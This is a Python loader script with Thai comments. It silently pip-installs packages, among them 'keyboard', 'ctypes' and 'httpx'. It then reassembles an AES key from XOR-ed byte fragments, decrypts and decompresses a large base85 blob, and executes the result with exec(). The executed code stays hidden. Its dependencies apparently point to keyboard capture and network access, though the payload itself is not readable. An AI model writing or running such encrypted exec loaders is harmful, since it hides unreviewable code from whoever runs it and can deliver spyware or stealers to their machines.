
import sys, base64, zlib, subprocess

def _req_check(p, m=None):
    if m is None: m = p
    try:
        __import__(m)
    except ImportError:
        print(f"[*] Installing dependency: {p}...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", p, "--quiet"])

# ติดตั้งตัวถอดรหัสก่อน
_req_check("pycryptodome", "Crypto")

# ติดตั้ง Module ที่แสกนเจอจากโค้ดของคุณ
_needed = ['rich', 'ujson', 'httpx', 'datetime', 'asyncio', 'subprocess', 'os', 'ctypes', 'keyboard']
for mod in _needed:
    _req_check(mod)

from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

def _xor(p):
    from functools import reduce
    return reduce(lambda a,b: bytes(x^y for x,y in zip(a,b)), p)

_K = _xor([b'\x05Y\xfa\xc7\x81\xe5\x9f\xbe\x08/[\xeaxM\xa2\xbf\x19\xafaa\xec\x82\x88jXO\xaa\xc0\xe4\xc2|_', b'I\x93\xe9\xdcoo\xd7\xe5\xfa8\xd2\xfefWG\x9e\x04\xd5s\x9c\x89\xeas\x80L\xe2\xd5xY\xfc\xc0\xf1', b'<\xf4\xd7\xbdC\xe7\xde>\xfd\x8b\r\xdbe\xf7\xc0\x17\xf0\x1e\xa6\x84\xda\x17\xe4\xd5\xdb\xbbV \xca\xae\xfe\x04'])
_I = _xor([b'\x14\x95Xp\xd5)9an\xa6\x90\xb9\xf1\xe67p', b'\x8d\x9bp\t\x80A*\xc7\xf5D\xfd\nh"kZ'])

def _decrypt_str(d):
    iv, p = d[:16], d[16:]
    return unpad(AES.new(_K, AES.MODE_CBC, iv).decrypt(p), 16).decode("utf-8", "ignore")

def _decrypt_bytes(d):
    iv, p = d[:16], d[16:]
    return unpad(AES.new(_K, AES.MODE_CBC, iv).decrypt(p), 16)

_enc = base64.b85decode('^SYd;u*V0)Dq&uDe|H=@GxKPrROnA;2a;|>ci&5PjsJyr2IT*>*~8l!MYm>g`Ud!LG}IX!j~UH=cW^R#;h-iNw;%RW(TZbYc9s_XhflK3A*yvT1PZeT4JLhv_o<K5KAuQCG2eTS70O1oQ9!JCYVlM|7CV*r7vM5!^A93QIJ=dRl$*SszD~RyS9cE-KVqfnd#VWe`-KF9S7FeFE;BG9=<cLnWt1IIu-d-fgkd=lDIIEyC71CUPi?<;KB{tBPQ}oIM9x#=+N7;Oa*Py*zDVL0P7p*d#5m*j0)~*)C4x&<({8}GFv|5L4<|f%8qHt5czS;UPS{WtmTbP(K+CQ;$*;b4%lP7P?Z0Sq0&Py`Qfgf!aB2^ejxri_b;2r$-?m|1EB?u?rugjf9PgmSLud*fP+Ne5v#GxXot0b{IlG`HYP~L)WqzRXYtIYdjAJDoY7HJHR*`V(GVWiROmw#}m*j@9NzUSZi_uk|=}ROgOo2YEol0u2`7Env0xA83yTeUrWvwq>%(7Rl;`<?c9VG=pX^*e!5(NsUFL#}s)HwLIVcILUz0fYht*Uvmy0lTD8bNw{=~6X03CIt7$}PXY8Ra=%glo$*I&mCuh(yF~0G^hNmfK`D8cH?mPthuF%mZW;8`P%Vvy1m`_+fTBs|!d6pZ8;3Xwv9R#~M5{@;g%T&|J@|5Z-HF#u+m0#6jP6Z!Ttdrj<jYkNxFQffUyM<Lu@A#@7+EL<vc^KHs-pK^(pmU?GCNGOO^ubUV|z&2;f?GG0NeybX^J_pSp61eo5P7H+>!gSZsB=-_b9B|qKWteXZ%;l!5RqeS1l@3+*SK(3Y1(Tp?FkBuIUJY_tGycE9o{#5?u%@4T${%t4?$KkjkU#}|LYaC=BO%<Hbc&!c*Uf;l%di36Ju?ADs*n1ICs)MIQ3g+Uy$CRm*$wDB_ah@2m2x_W3lrtU!Fmgm<Eyo~V$nb<oElvq7?bKBWfeFl=$)umI!BTS|Vu%~a^P<by`pdfq<{dR8K5VRD+LaLl52w<XA4S7qEM@ho@vBjNy1S@PvryB=vD#nkEu>S|??{+@Sp(Jxb0`c0&H}O*6#~JbHl%i9&S+0uL|}K9U^sMY^TiT<>W;HUQCsmB1zGI;tp&MBHzt6&=2BP>ek8lMOW0I@6NNuqlx0(#3rcXi-P`Sh4e?ivfHh3wdAB=E^!zE@;?HN<f;0?}0e^fNu;fAUseWP;pY#P}1m6K?)%6_C@HHB1tkTQpj!B~Wm0MV=n${G3#t0D0!%6}Ak0?S(y`|&|*TSt%WP*}8r>Xk&F4nrxee9~t2;L|aU6Al7#*#UqNi4$olV?>pCb)NXQG%)swYLe{Kv#Y^Lxo^0pl}jTrkg__6uzDIHFf?U*7aTA?*T&<<k#hZAXJg1-v(;F9jGCT2hW}|x)T!A#2N}GSMdUj!)n{BmPL5{p#;mHehV#{ca6o+4ioZdQ#Fk=F^~vhxQHi&qKx77-IIgf+Tmgf>wZ=NLab?^)4-q*zCc`JIEDH}XV*=5a5+3A;8=HP(ofyJfPG9*)DMY;6X>QicO^iMqOfM=`KZ)23`LK}Z8wK6xTg2V#U>H0S8{Sm$XvXDn4c})oFHr&@gs?8I}c?-J82N2&a$ueN98>-7o%_;y1AN6G15hgLxsM>HbEqgv~t+=@@=nkq4#zgqq1m)_!pv>0vhQD6nU%ooZn~XEoPz~VFy6R%PHwbP7!`#lGipQ5BtazF!Et7j1!~>0;21=<Lq^Rgpl2$AK=lMe>Tv}NbLupTv94@>E_?mj~^LhXspg2m1R$1r*jhk5h%!_baKkoI(INW)mNdb&X2Qa#B8B6vow%wULtq%gg$}?+S+i{mtlr%%x+e-VRp#}B({8Ngd7;WN9=h(-<m1cSu|c-8rcov))c-$vL)#_<Kum!`;Q(M#F7cx_uLt2Q;U?+kx);~tONS_?|qX1Etxq#t*np6{CciYZSv9xt4Czg5Sa2xcr=37aNQ7C*3a1!g8&y_<qBMarMqlYc}A_flL7yw%?4bXg^o`6zBbjc%iu%=kI%L|k&c`725b)Q-TD~*-}mH<SA}&reU;k)sgkORbeO^&Ef*|rrAwO=ztD6dC@&NRE-u`rVR&1A%irG)C%6E1I}JOkD3579+9NM;$;c0zpKqScFK+?xv6!RGxIStP)SsP-EjRlErJpXF)fBUh?e~TdChfjL-j_Hg)9qMXa}gB6?``r~zDg>Zcd!nrBaa|U@})fca2;%9cgzKoig<kQk}>IRUJVveim_kM&+KFCVF*2UhD40XJSA1*ZeFFkDmCIa%%tG?zjk{cayd`>2iF=>y&Y7+--<;-UmEDOzs?9XIQAh_*3$uiz8avsKXu`uSS^FKxOwYB_Ein3`P^j**!<zpW$o=Ga@33Hw9!GQ|L&MtwxGj_&M6{f^01Rl_u`5e!KcSPZ?=nxq~IR$*QbZjvQ~FCaK@`A*evD!6{|2nj_)G|x93&SK@1*)S~*$%IWI@Mnt{v1R!aJoV=Pbl_Grz?e1p~oj@0g(I?0K<=psbgg-;XTvUQR*J1is35Gju7w4!&oO0lE$aJJXT9@Y@7+w7K3!mWwf@%>uEYb-#i^?+r#FJ^wOizl~ZT=9JDX!y1ia&JYwq}S<@e!y!QrHK>@iEmumS|IG^en+#6`8nskA~PLdr-U><qq=u@R9kl$8USRiu$1w7J(|?-&yIe<o@Z5mo`h8Omge)U*2LY>JQIf4V@oc{<oF?-3udZ)ralFKTyyR3mK`_A2ru8Xv1lZ@E?Z|^)ja~?ydA?bl{sZ-czKgNrr{NG!qRr_iXUs+5_+Z)LknXJF{|#?<`e%;KJ3XqN!A`c9-s8fniVqC|NfraCSaGYl?1S0YbYd^5L(>8xc19KD;$XW#}>6?py~<)dX}WX92y|oYG9;yR4UJ{UXi?ttBqW4rSSTVT#kH6@OGZ6u0@?Bd#nL(pa}HH=+D8;7lcJk$yp+pnwYO#KTH4&jwm0X1mR<;esxKvFGaFQQ+tX%13zc#%`R&ZKzOJWX^EcF&S9{^jf*I_DD%Ngpu1=i<Nf9u_?%z{6ev~15Tk$(x?9~X)jxm(mFuhPxV8e=<ZSB`iuI!!mb|Y)Y4!u1ZIS3}nR1h6EIzwHL6M#p>}JTrctGp?PH><G##eib%Ts}H*lXaW`M@EZSx2Klc|u}kf&wxH{q|{dzHy&kj=EH3H*U2hmsk}(rDxc~awj1O+05yKib#j76JLRL6N$9GRgM*tnHiIzDr+Ek%#So_xS*^?g)e@;b7|bAc>NlCe9DfyjD%u7w=F4|lt6Jt9<=SL?;x^h^MZ6;wyZ4a_j;VniE;-xwBe0>$B{8q8?YLc?xA4fLlSABW66BKO6)B&%uZTKHYx8Fvr=m6O-Cz1Tm8yFv@u28k8(XQi-n#D<@W2|XotuO4qw55)06n?0L7_vfe!|%@o@h8a;xVK{t6(1^Lz&`;w@%IF<5NL7`au00pTX*EJ+rGvm}m9qs#RI)MS-Ql|eVabmg3elajUhpYv@xi0o!&z^P*>8V=Fg3!FNnJ6KrxNn5w?BtWdDKQ|kV!wi!Jy(n5Dw+FN(F%Dr#jI5owYn+i$>56=+MIh-iNaKty-759JtoW*;PxU~)&UQyK!gQGZV&srRJ4kJ4Sh^3Z_H)lh?@_yBK~BD6j;c`W%8^h8jC+*kK<%NBJu|7VV1}vVU}b#c#iZ^ns+V~1#bm9gBjy>AKtXJgnFzM;u^a&wYLBVJ+_pny5*QS1ba-ps0a2d3gmI<2oM*(|2)?C`{bxx$4o7(YX9yco7p63|>Pq!RfnCDFfRpl<{4oA+UT=DUAT4V+&nz8xnZ9^3tG*d6Y@4j74!k9(P@ZGxOQP-9X9-nBiLWXdy6blkV`O?VN$VA3u~ydk;qTujbqrE{FiQZqT!PiJr;X4!GB!}e?o6gM7M7_8OaNp1%a@K0Q1%_)QafEIBU9!i+u3C#OcQKmHnT)a*rWg48)zy(Q(ZmuOT8Wc+c`)nEvJIyv*r>h)!Ts7uPEVJlY*Xel~;TTsd?9~-Sz83ox!cYHT$Do=H^-+?T4Rc%#|8i`m&*J$s~)0MZ$pmhkkWWmc7onU{9UUOTLr;KEb`L__Bg^0!wPIdr0VoRa^5X+y>_<>xmE5?pz1e@rM*xm}~d#L7I!DJW~l9z!9IEmu^UgCstU5OnaZ;E$>+|er@aL3Xz2!#}M=!Y(rN>j`1de7nt$tF~{Ut%OF9^pSCOZgC92&b_(pK=EK#?WoL~cN4lFA%>=!I-}_($Z0L5=6HwupbAjaeSw>->PNvQ4upy-&@ZJ(S2tIex!#z1^n6jJzGI}-CTP?86@Gig?)r$dHa)-qV9bkef7-uONe^YB;3n0kpE5tvI+IQby%pAGRcb)sT6mpWu;mtBwVs555qN~0$GiGxNL^d5P^ou!AcxAP>FlG&x9>m0tk6@GcnCg6r&pgD0O#LxUEIeTSS8;Vsv#9}T(5_&j6#p`|^T1Up_pjk?zEgjQk2iqtKFIF^D!{<&XO!A2q}b$2o%QdYLGn!SYmzUz8p~N2-D}YMKk%3Op-}pxbPa*JZ4=3J>(4vw&?C%OU_OhNpGZWWdm|U28uv%4W>RWiZc?X(o2`bZ-F~H+UZ-s<*Qnx=nlcZC2tY}yBACZx`PM}FIJ*A|X00C{@#CHJX=xm)a!FtTzI2#vAIiL&L^*zk<nn0@$D+a#VscH&A!|IpalIMj&Lv>QQH3w0fY2Lc^aoySGtsXn-rd2M&oza{Pl2PyS2V-iYXBw1(34Rh`>>orxs!)4=$*AD+;VRZNPPuap>1tz7C^RM<$mXoEqB=os3enFCJB}0M83*o<<6iLgZ1Uo>-(NAqRXZ?1LeMhO4NpkhFzCPq*9nI5~wVtvp`4PAw~c92%yGQb-9C!c;^^3On%@3cSen`l_d-_sFrw*%m7imHd?T9!<h6%-(%?Q5<AEgF(f&CcR!lf_Wj0o^U-w+t$VHNT8uK4mnu8H&DK*N`8hql2XKRDff7Q*RlC+J-AQ(`^^)pH{)|N$%SWpxb?2F|4On2xnk@l2$j`^~*1r-^?H&i5>{|?n;*-vZZ0Q@ORKwO9MHmEC0as)}&}ZxC+a-FUIe`H6IpGQ-_q<F@QND+uWMB3^G0qEyTWp#aEi}mC_Fk5B?I-xs)g_WV2}tEX@d*jzxLf&whxhDoo>l7J`E%soUVT&XKV_`+e&p3IT#n<;{Oy(6*!IA9JtL>?)j5WU5uH_RL1sL!e8|#kGx2fw39d&~J>`1}uf<`CF6N1ybhg4m{M4VlFNeyk(C)~hX-EeD9)H#nOt|>3NREK|z;qmy!lMPKwDv7sG1euxqCb#jq}Aq;|F>rXci^N4u&rzK3;hNY*CWnMtIQP}S+Qyy5$WEMyEr@X(ADH@gu*bM5vGQWYDV_-1LD*gS6$7gE%T%HSpNCku3GfnL7$iciEIL&A8YxC>%t+K#k!N09JB7HkGq3~@xp=FQ>#te^3QeR3Z)-P3HOwjGf7r^fo{e+tTl`Pfxb60=>r~!TrWib%wTvjHu!Y!V_~QlgOm^;i+wg;77tgx)5~#@QHqGnav&+PG~opj{L_ey5rmaCkE<z1OoNt^<fK1B=9+GX0buAt+)zYPW7S$C*Q8{KR_F8ku9c!v%}AdSxCMc^*Tv#lzt|TRr3&g&n4=-qx9;o$=-tJhxB&StuLNLm)JpBUQPRN1D=t?cE?XR3g5sBunT0~AXHf9I@Ocw&{9v_kj_F-QP}lCDpA+jzbsKw)d@ntGdwrQ|t_q1;Pp@|wVe<|eMi{Zbb)gR%nFu&Xd!o%QP_x$=ugy&ifsnRM{3yd3aRmP9{>8g~ZpT0j%bM6ccf5{ShJJNf9RR`Z4mdEiy5ki1300eW!YEE_r${qR#{w4WJF}m9H*;jn%P0Pb?}w2;OE$qgz>QT#2+iZjjeGm>wLaM;lQW15qPkllK0Bjm4}F(X2SY~XH2urFpf~MJxk!H(=y@R1@;8^c#FB){r?h81ZQU#t7b<}t{#MKNXtXq!S4kW%B8DWfOptd^KUKujt)Cyg3~7juNfE=bQrEhrLQ`r2=fWVBw2g;BG<C12bAS=MT%oYyHr0PcKmqL0vVHF{i{t~i6Bd<uR*-++e-%n&G=2j>O&tbGO{gGI>%8WTI~JYATGWZJ>%V3@`B(FD7?{V2cUV6BNiG!m$2A^V-R(25lK4KY5tJ#R@+%+Og+jV&#KSkI@|YL`SCW0~40JW$yONaFBD8UZpU@Lh2K*&&)9L8t{eyT)AQ4*5+oo?U=TP)y8AA$pghR$Jr^Iy))Rvwv{KQk3x$V9}e{SJ0sR-b**q|?V%qg`|)pz;cIY8y?M{G@p0cNhg5TZ~AlXASt2bRBD%c$aAC|3rS^De9{m$?RpNn8W3&Tbi;i^kFhETKQ$3u2}<=?%jqU%leZ1xpf?;*Hc!B?avZ`k{Htujr)j*;n=OQvbQ9?P}WpICAEkb<ZnNL+Jp(B=4m4qJktnf)mmDR6>D|ssBo5dP<t&U5|S^B?Kc_o3fQzJc{gYU?VqY25NF0#emc&W*8A<(&zhDeEg*$noIpd1_(N#EIpUQslOL$Gl2B@0S-5A3K`jv5YjLsx2X4Hb@97?==S`8EJac=6I0&zot5R%N62WM9lRSN{xS7ubbk`cT9RH9t*l~rj3BbQc6auM6z$D(z4i3-PLrp_ofsg0dJ_|;l6Jb3uFNEp%EcO_&Z<UnMZ)fsDFo?6qv4`|7~2GRHMqo?p~Vf+=>!~+F#a~Kj%qp!IEUYf)L&FU+JohGT&Iw0e9}=o_FjwloLt&;sjV8UtuTV^YjIK1Ab#4(r7RH+=0;o%BBqbW6PjNL;&2=&Vd3uvjDZ&fC6dIWE6~tdu{VUXm+1=io??w-b1Xackh5CkoXC56gL4|-X_tbFH}?2vptDPUY)@gec1I9%-;RklFt6p0gp9CnPFww^D8dEq5t;9}Z3*TpS;-@x%P?ycWA{QIPW-h!%36Y_vM3ddQ4W6|hnUl5U$$pJ9qJ~M>6ev>m9~N-Gu*~wTQhxC;}qCzlX`R_)jJ02w_USS6yQ(keo1EDF!jv+f9TdWm0ZxwYym^+jl?U_H-$T1I8`O^oj%5k!ggj-Hx2vI6$hkjk)mj5=c!H|a>SwYO1;m)n+$8L@T(xO64`(_-Xz)L-&Bv<ZYz`wk^edrhL1(QuMusOj7$oq@Z#0CNi>?;^zO3qI_+OcQN6iM1$7u=sK0x{W~Xzrqs3t$4AQi#B?~c>;-!v490v3AaQ4<QjzN3>4cfBj0;{9D3oPQj7qi!kU%<>><54~l)OIf_W148ZLd&X#$es7O7_;p(`p2hO+%54^a_X1d8gijy&V>}^#Ed9;35XXhPdPi85{fUu2}{RDr3n(6WLYxd$<r0)P56au_;zol;6dDBIw8e1<sz~eL#mW)7oshQ$BgUy=BGbm<zQn8+#Kjd_yY0HY)X}e5qT3~5RUS;tex{@7<Rn=no_2j6pA!_TmvKn-q!s%?6F1o!=ANt{tJ%k56Nf|p#$?-z7z&^(D%QBmm3WRCg1wqH?o%{a<dc4VJGDU4WG~9G8aGC8iw)!ohtE}z|)IZaJxW^M^eM@+A{QUuAl{uNPTfk%c_(`^)~z(T!-BRzx8P#{_kU9pz1A2w$+P~')
_raw = unpad(AES.new(_K, AES.MODE_CBC, _I).decrypt(_enc), 16)

# EXECUTE UNIVERSAL CODE
exec(zlib.decompress(_raw).decode('utf-8'), {
    "__name__": "__main__",
    "__builtins__": __builtins__,
    "_decrypt_str": _decrypt_str,
    "_decrypt_bytes": _decrypt_bytes,
})
